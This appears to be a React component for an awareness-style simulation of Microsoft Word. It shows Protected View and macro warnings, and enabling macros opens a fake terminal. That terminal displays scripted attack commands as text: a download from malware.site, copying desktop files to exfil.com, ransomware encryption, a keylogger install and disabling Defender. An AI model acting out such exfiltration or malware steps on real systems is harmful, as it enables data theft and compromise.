import React, { useRef, useState, useEffect } from "react";
import Draggable from "react-draggable";

// Simulated malicious commands that would be executed by the macro
const maliciousCommands = [
  { command: "connect malicious-server.com --port 22 --stealth", delay: 500 },
  { command: "download https://malware.site/trojan.vbs", delay: 1200 },
  { command: "accessing C:/Users/*/Documents -r", delay: 800 },
  { command: "copy C:/Users/*/Desktop/*.* https://exfil.com/data", delay: 1500 },
  { command: "modify registry HKEY_LOCAL_MACHINE/Software/Microsoft/Windows", delay: 1100 },
  { command: "encrypt C:/Users/*/Pictures/* --ransom", delay: 1300 },
  { command: "install keylogger.exe --silent", delay: 900 },
  { command: "disable defender.exe, firewall.sys", delay: 700 },
  { command: "message Infection complete. System compromised.", delay: 800 }
];

// Terminal simulator component
const TerminalSimulator = ({ isVisible, onClose }) => {
  const [commandIndex, setCommandIndex] = useState(0);
  const [currentCommand, setCurrentCommand] = useState("");
  const [commandHistory, setCommandHistory] = useState([]);
  const [isComplete, setIsComplete] = useState(false);

  useEffect(() => {
    if (!isVisible) return;

    // Start typing the first command
    let timeout;
    let currentText = "";
    const command = maliciousCommands[commandIndex]?.command || "";
    
    const typeCommand = (index) => {
      if (index >= command.length) {
        // Command typing finished, add to history after a delay
        timeout = setTimeout(() => {
          setCommandHistory(prev => [...prev, currentCommand]);
          setCurrentCommand("");
          
          // Move to next command or complete
          if (commandIndex < maliciousCommands.length - 1) {
            setCommandIndex(commandIndex + 1);
          } else {
            setIsComplete(true);
          }
        }, 500);
        return;
      }

      // Type the next character
      currentText += command[index];
      setCurrentCommand(currentText);
      
      // Schedule next character
      const randomDelay = Math.random() * 100 + 30; // Random typing speed 30-130ms
      timeout = setTimeout(() => typeCommand(index + 1), randomDelay);
    };

    // Start typing with a delay
    timeout = setTimeout(() => typeCommand(0), maliciousCommands[commandIndex]?.delay || 500);

    return () => clearTimeout(timeout);
  }, [isVisible, commandIndex]);

  if (!isVisible) return null;

  return (
    <div className="fixed top-0 left-0 w-full h-full bg-black bg-opacity-80 flex items-center justify-center z-50">
      <div className="w-3/4 max-w-3xl h-3/4 bg-black rounded-lg border border-gray-700 overflow-hidden flex flex-col shadow-2xl">
        <div className="bg-gray-900 px-4 py-2 flex justify-between items-center">
          <div className="text-white text-sm font-mono">Command Prompt - Administrator</div>
          <button onClick={onClose} className="text-white hover:text-red-500">✕</button>
        </div>
        <div className="flex-1 p-4 font-mono text-sm overflow-auto text-green-500 bg-black">
          <div className="mb-2">Microsoft Windows [Version 10.0.19044.1826]</div>
          <div className="mb-4">(c) Microsoft Corporation. All rights reserved.</div>
          
          {commandHistory.map((cmd, i) => (
            <div key={i} className="mb-1">
              <span className="text-blue-400">C:\Windows\System32&gt; </span>
              <span className="text-white">{cmd}</span>
              <div className="text-green-400 ml-4">
                {i === 0 && 'Connection established.'}
                {i === 1 && 'Download complete: trojan.vbs [76.5KB]'}
                {i === 2 && 'Found 215 files. Accessing contents...'}
                {i === 3 && 'Files copied: 42 documents, 18 spreadsheets'}
                {i === 4 && 'Registry modifications complete'}
                {i === 5 && 'Encryption in progress: 128 files processed'}
                {i === 6 && 'Keylogger installed successfully'}
                {i === 7 && 'Security systems disabled'}
              </div>
            </div>
          ))}
          
          {!isComplete && (
            <div>
              <span className="text-blue-400">C:\Windows\System32&gt; </span>
              <span className="text-white">{currentCommand}</span>
              <span className="animate-pulse">▌</span>
            </div>
          )}
          
          {isComplete && (
            <div className="text-red-500 mt-4 text-lg">
              System compromised. All security measures bypassed.
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

const ribbonTabs = [
  "File", "Home", "Insert", "Draw", "Design", "Layout", "References", "Mailings", "Review", "View", "Developer", "Help"
];

const fontSizes = ["1", "2", "3", "4", "5", "6", "7"];
const fontSizeLabels = {
  "1": "8pt",
  "2": "10pt",
  "3": "12pt",
  "4": "14pt",
  "5": "18pt",
  "6": "24pt",
  "7": "36pt"
};

const Ribbon = ({ onFormat, onFontSize, onFontColor, onList }) => (
  <div className="bg-[#eaf1fb] border-b border-[#c7d6ec] px-4 pt-1 pb-2 flex flex-col">
    <div className="flex gap-4 mb-2">
      {ribbonTabs.map(tab => (
        <div key={tab} className="px-2 py-1 text-sm font-semibold text-[#2b579a] hover:bg-[#dbe7fa] rounded cursor-pointer select-none">
          {tab}
        </div>
      ))}
    </div>
    {/* Example controls row */}
    <div className="flex gap-8 items-end">
      <div className="flex flex-col gap-1">
        <span className="text-xs text-[#2b579a] font-semibold">Clipboard</span>
        <div className="flex gap-1">
          <button className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm">Paste</button>
          <button className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm">Cut</button>
          <button className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm">Copy</button>
        </div>
      </div>
      <div className="flex flex-col gap-1">
        <span className="text-xs text-[#2b579a] font-semibold">Font</span>
        <div className="flex gap-1 items-center">
          <button className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm font-bold" onClick={() => onFormat('bold')}>B</button>
          <button className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm italic" onClick={() => onFormat('italic')}>I</button>
          <button className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm underline" onClick={() => onFormat('underline')}>U</button>
          <select className="ml-2 border border-[#c7d6ec] rounded text-xs px-1 py-1" onChange={e => onFontSize(e.target.value)} defaultValue="3">
            {fontSizes.map(size => (
              <option key={size} value={size}>{fontSizeLabels[size]}</option>
            ))}
          </select>
          <input type="color" className="ml-2 w-6 h-6 p-0 border border-[#c7d6ec] rounded" onChange={e => onFontColor(e.target.value)} title="Font Color" />
        </div>
      </div>
      <div className="flex flex-col gap-1">
        <span className="text-xs text-[#2b579a] font-semibold">Insert</span>
        <div className="flex gap-1">
          <button className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm">Table</button>
          <button className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm">Picture</button>
        </div>
      </div>
      <div className="flex flex-col gap-1">
        <span className="text-xs text-[#2b579a] font-semibold">Lists</span>
        <div className="flex gap-1">
          <button className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm" title="Bulleted List" onClick={() => onList('insertUnorderedList')}>• List</button>
          <button className="bg-white border border-[#c7d6ec] px-2 py-1 rounded text-xs shadow-sm" title="Numbered List" onClick={() => onList('insertOrderedList')}>1. List</button>
        </div>
      </div>
    </div>
  </div>
);

const StatusBar = ({ text }) => (
  <div className="bg-[#f3f3f3] border-t border-[#c7d6ec] text-xs text-gray-600 px-4 py-1 flex justify-between items-center">
    <span>{text}</span>
    <span>English (India) &nbsp; | &nbsp; Accessibility: Good to go</span>
  </div>
);

const Word = ({ isAppOpen, toggleWord, bounds }) => {
  const wordRef = useRef(null);
  const editorRef = useRef(null);
  const [savedText, setSavedText] = useState("");
  const [protectedView, setProtectedView] = useState(true);
  const [showMacroWarning, setShowMacroWarning] = useState(false);
  const [showTerminal, setShowTerminal] = useState(false);

  // Reset protectedView when the app is closed
  useEffect(() => {
    if (!isAppOpen) {
      setProtectedView(true);
      setShowMacroWarning(false);
      setShowTerminal(false);
    }
  }, [isAppOpen]);

  const handleFormat = (command) => {
    document.execCommand(command, false, null);
    editorRef.current.focus();
  };

  const handleFontSize = (size) => {
    document.execCommand('fontSize', false, size);
    editorRef.current.focus();
  };

  const handleFontColor = (color) => {
    document.execCommand('foreColor', false, color);
    editorRef.current.focus();
  };

  const handleList = (type) => {
    document.execCommand(type, false, null);
    editorRef.current.focus();
  };

  const handleSave = () => {
    setSavedText(editorRef.current.innerHTML);
  };

  const handleClear = () => {
    editorRef.current.innerHTML = "";
    setSavedText("");
  };

  const handleEnableEditing = () => {
    const confirmed = window.confirm("Warning: Enabling editing can harm your computer. Are you sure you want to proceed?");
    if (confirmed) {
      setProtectedView(false);
      setShowMacroWarning(true);
    }
  };

  const handleEnableMacros = () => {
    const confirmed = window.confirm(
      "SECURITY WARNING\n\n" +
      "This document contains macros that can potentially harm your computer.\n" +
      "If you enable macros, code may execute that could give control of your computer to an attacker.\n\n" +
      "Are you sure you want to enable macros?"
    );
    
    if (confirmed) {
      setShowMacroWarning(false);
      setShowTerminal(true);
    }
  };

  const handleCloseTerminal = () => {
    setShowTerminal(false);
  };

  // Count words in the editor
  const getWordCount = () => {
    const text = editorRef.current ? editorRef.current.innerText : "";
    return text.trim() ? text.trim().split(/\s+/).length : 0;
  };

  return (
    <div
      className={`${isAppOpen ? "" : "hidden"} z-30 w-full h-screen pointer-events-none absolute`}
    >
      <Draggable handle=".title-bar" nodeRef={wordRef} bounds={bounds}>
        <div
          ref={wordRef}
          className="window bg-[#f3f6fb] w-[60em] h-[40em] rounded-xl overflow-hidden border-neutral-700 border-[1.5px] pointer-events-auto shadow-2xl flex flex-col"
        >
          {/* Title Bar */}
          <div className="title-bar bg-[#2b579a] flex items-center justify-between h-10 px-4 select-none">
            <div className="flex items-center gap-2">
              <span className="bg-white w-6 h-6 rounded-sm flex items-center justify-center text-[#2b579a] font-bold text-lg">W</span>
              <span className="text-white font-semibold text-base">Doc1.docx - Word</span>
            </div>
            <div className="flex gap-1">
              <div
                className="material-symbols-outlined hover:bg-blue-800 w-8 h-8 flex justify-center items-center text-xl text-white rounded"
                onClick={toggleWord}
              >
                minimize
              </div>
              <div className="material-symbols-outlined hover:bg-blue-800 w-8 h-8 flex justify-center items-center text-sm text-white rounded">
                check_box_outline_blank
              </div>
              <div
                className="material-symbols-outlined hover:bg-red-700 w-8 h-8 flex justify-center items-center text-xl text-white rounded"
                onClick={toggleWord}
              >
                close
              </div>
            </div>
          </div>
          {/* Ribbon */}
          <Ribbon onFormat={handleFormat} onFontSize={handleFontSize} onFontColor={handleFontColor} onList={handleList} />
          {/* Protected View Bar */}
          {protectedView && (
            <div className="bg-yellow-200 border-b border-yellow-400 text-yellow-900 flex items-center justify-between px-6 py-2 text-sm font-medium">
              <span>
                PROTECTED VIEW: Be careful—files from the internet can contain viruses. Unless you need to edit, it's safer to stay in Protected View.
              </span>
              <button
                className="ml-4 bg-yellow-400 hover:bg-yellow-500 text-yellow-900 font-semibold px-4 py-1 rounded shadow border border-yellow-600"
                onClick={handleEnableEditing}
              >
                Enable Editing
              </button>
            </div>
          )}
          {/* Macro Warning Bar */}
          {showMacroWarning && (
            <div className="bg-yellow-100 border-b border-yellow-300 text-yellow-800 flex items-center justify-between px-6 py-2 text-sm font-medium">
              <span>
                <span className="font-bold">SECURITY WARNING</span>: Macros have been disabled. This document contains macros that provide additional functionality.
              </span>
              <button
                className="ml-4 bg-[#2b579a] hover:bg-[#204278] text-white font-semibold px-4 py-1 rounded shadow border border-[#204278]"
                onClick={handleEnableMacros}
              >
                Enable Content
              </button>
            </div>
          )}
          {/* Document Area */}
          <div className="flex-1 flex justify-center items-start overflow-auto bg-[#f3f6fb]">
            <div className="mt-6 mb-4 w-[60%] min-h-[70%] bg-white shadow-lg rounded p-8 relative border border-[#e3e3e3] flex flex-col">
              {/* Ruler */}
              <div className="absolute -top-6 left-0 w-full flex justify-between px-2 text-xs text-gray-400">
                <span>1</span>
                <span>2</span>
                <span>3</span>
                <span>4</span>
                <span>5</span>
                <span>6</span>
                <span>7</span>
                <span>8</span>
                <span>9</span>
                <span>10</span>
              </div>
              <div
                ref={editorRef}
                className="flex-1 w-full h-[20em] border-none outline-none resize-none text-black bg-transparent text-lg font-sans focus:outline-blue-300 p-2"
                contentEditable={!protectedView}
                suppressContentEditableWarning
                style={{ minHeight: '20em', backgroundColor: protectedView ? '#f9f9f9' : 'white' }}
                placeholder="Start typing..."
              />
              <div className="flex gap-2 mt-4">
                <button
                  className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700"
                  onClick={handleSave}
                  disabled={protectedView}
                >
                  Save
                </button>
                <button
                  className="bg-gray-400 text-white px-4 py-2 rounded hover:bg-gray-500"
                  onClick={handleClear}
                  disabled={protectedView}
                >
                  Clear
                </button>
              </div>
              {savedText && (
                <div className="mt-4 p-2 bg-gray-100 border border-gray-300 rounded text-black">
                  <strong>Saved Text:</strong>
                  <div className="whitespace-pre-wrap" dangerouslySetInnerHTML={{ __html: savedText }} />
                </div>
              )}
            </div>
          </div>
          {/* Status Bar */}
          <StatusBar text={`Page 1 of 1    |    ${getWordCount()} word${getWordCount() === 1 ? '' : 's'}`}/>
          
          {/* Terminal Simulator */}
          <TerminalSimulator isVisible={showTerminal} onClose={handleCloseTerminal} />
        </div>
      </Draggable>
    </div>
  );
};

export default Word; 